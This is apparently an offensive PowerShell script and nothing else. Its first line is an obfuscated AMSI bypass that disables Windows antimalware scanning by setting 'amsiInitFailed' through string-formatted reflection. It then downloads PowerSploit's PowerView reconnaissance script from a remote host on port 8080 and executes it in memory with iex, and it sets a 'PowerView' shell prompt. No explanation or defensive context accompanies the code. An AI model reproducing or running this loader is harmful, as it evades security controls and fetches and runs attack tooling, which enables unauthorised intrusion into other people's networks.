[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
$urlComb = "http://" + $urlGet + ":8080/PowerSploit/Recon/PowerView.ps1"
iex (New-Object Net.Webclient).DownloadString($urlComb)

function prompt{
    $currPath = Get-Location
    "PowerView $currPath> "
}